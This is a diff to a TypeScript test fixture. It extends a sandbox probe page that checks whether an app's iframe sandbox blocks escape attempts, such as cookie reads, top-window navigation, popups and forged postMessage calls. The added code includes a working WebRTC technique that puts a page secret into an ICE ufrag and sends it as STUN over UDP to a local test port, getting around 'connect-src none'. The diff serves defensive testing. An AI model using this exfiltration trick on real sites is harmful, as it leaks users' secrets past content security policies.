@@ -900,12 +900,21 @@ const GONE_REF = '4c'.repeat(32);
 
 const bind = (result: string, pointer: string) => ({ $bind: { result, pointer } });
 
+/**
+ * Where the probe's WebRTC attempt aims its STUN/ICE traffic: a loopback UDP port
+ * `e2e/sandbox.spec.ts` listens on. The reviewer's measurement, reproduced: with scripts running and
+ * no prelude, a packet carrying the page's secret arrives here although `connect-src` is `'none'`.
+ */
+const RTC_PROBE_PORT = 47140;
+
 const SANDBOX_PROBE_HTML = `<!doctype html>
 <html lang="en"><head><meta charset="utf-8"><title>Sandbox probe</title>
-<style>body{font-family:sans-serif;margin:8px;color:#111;background:#fff}#tall{height:520px}</style>
+<style>body{font-family:sans-serif;margin:8px;color:#111;background:#fff}</style>
 </head><body>
 <h1>Sandbox probe</h1>
+<p><label>Secret <input id="pw" value="USERTYPED42"></label></p>
 <ul>
+<li>script: <output id="ran">no script ran</output></li>
 <li>fetch: <output id="fetch">pending</output></li>
 <li>csp: <output id="csp">pending</output></li>
 <li>cookie: <output id="cookie">pending</output></li>
@@ -913,22 +922,41 @@ const SANDBOX_PROBE_HTML = `<!doctype html>
 <li>parent: <output id="parent">pending</output></li>
 <li>top: <output id="top">pending</output></li>
 <li>popup: <output id="popup">pending</output></li>
+<li>rtc: <output id="rtc">pending</output></li>
 </ul>
-<div id="tall"></div>
 <script>
 function put(id, text) { document.getElementById(id).textContent = text; }
+put('ran', 'script ran');
 // A \`data:\` URL, so neither CORS nor the shell's CORP can be what refuses it: without the shell's
 // \`connect-src 'none'\` this fetch succeeds, and the violation names the directive that stopped it.
 document.addEventListener('securitypolicyviolation', function (e) { put('csp', e.effectiveDirective); });
 fetch('data:text/plain,probe').then(function () { put('fetch', 'allowed'); }, function (e) { put('fetch', 'blocked: ' + e.name); });
 try { put('cookie', 'read: ' + JSON.stringify(document.cookie)); } catch (e) { put('cookie', 'blocked: ' + e.name); }
 try { localStorage.getItem('chemclaw3.theme'); put('storage', 'read'); } catch (e) { put('storage', 'blocked: ' + e.name); }
-try { put('parent', 'read: ' + JSON.stringify(parent.document.cookie)); } catch (e) { put('parent', 'blocked: ' + e.name); }
+try { put('parent', 'read: ' + JSON.stringify(top.document.cookie)); } catch (e) { put('parent', 'blocked: ' + e.name); }
 try { top.location.href = 'about:blank#escaped'; put('top', 'attempted'); } catch (e) { put('top', 'blocked: ' + e.name); }
 try { var w = window.open('about:blank', '_blank'); put('popup', w ? 'opened' : 'blocked: null'); } catch (e) { put('popup', 'blocked: ' + e.name); }
+// The exfiltration CSP cannot see: the secret in an ICE ufrag, sent as STUN to a UDP host.
+try {
+  var secret = document.getElementById('pw').value;
+  var pc = new RTCPeerConnection();
+  pc.createDataChannel('x');
+  pc.createOffer().then(function (o) {
+    o.sdp = o.sdp.replace(/a=ice-ufrag:.*\\r\\n/, 'a=ice-ufrag:' + secret + '\\r\\n');
+    return pc.setLocalDescription(o);
+  }).then(function () {
+    var remote = 'v=0\\r\\no=- 1 2 IN IP4 127.0.0.1\\r\\ns=-\\r\\nt=0 0\\r\\na=group:BUNDLE 0\\r\\n' +
+      'm=application ${RTC_PROBE_PORT} UDP/DTLS/SCTP webrtc-datachannel\\r\\nc=IN IP4 127.0.0.1\\r\\n' +
+      'a=ice-ufrag:abcd\\r\\na=ice-pwd:abcdefghijklmnopqrstuvwx\\r\\na=fingerprint:sha-256 ' +
+      Array(32).fill('AA').join(':') + '\\r\\na=setup:active\\r\\na=mid:0\\r\\na=sctp-port:5000\\r\\n' +
+      'a=candidate:1 1 udp 2130706431 127.0.0.1 ${RTC_PROBE_PORT} typ host\\r\\n';
+    return pc.setRemoteDescription({ type: 'answer', sdp: remote });
+  });
+  put('rtc', 'constructed');
+} catch (e) { put('rtc', 'blocked: ' + e.name); }
 // Messages the app must not act on: the wrong type, and a height that is not a number.
-parent.postMessage({ type: 'navigate', href: 'about:blank' }, '*');
-parent.postMessage({ type: 'height', px: 'tall' }, '*');
+top.postMessage({ type: 'navigate', href: 'about:blank' }, '*');
+top.postMessage({ type: 'height', px: 'tall' }, '*');
 </script>
 </body></html>`;
 
@@ -957,8 +985,8 @@ function wave3Header(id: string, kind: string, title: string): ExhibitHeader {
 const WAVE3: Record<string, Wave3Artefact> = {
   [HTML_ID]: {
     header: wave3Header(HTML_ID, 'html', 'Sandbox probe'),
-    spec: { kind: 'html', html: SANDBOX_PROBE_HTML, height: 320 },
-    raw: { kind: 'html', html: SANDBOX_PROBE_HTML, height: 320 },
+    spec: { kind: 'html', html: SANDBOX_PROBE_HTML, height: 520 },
+    raw: { kind: 'html', html: SANDBOX_PROBE_HTML, height: 520 },
     bindings: [],
   },
   [BOUND_TABLE_ID]: {
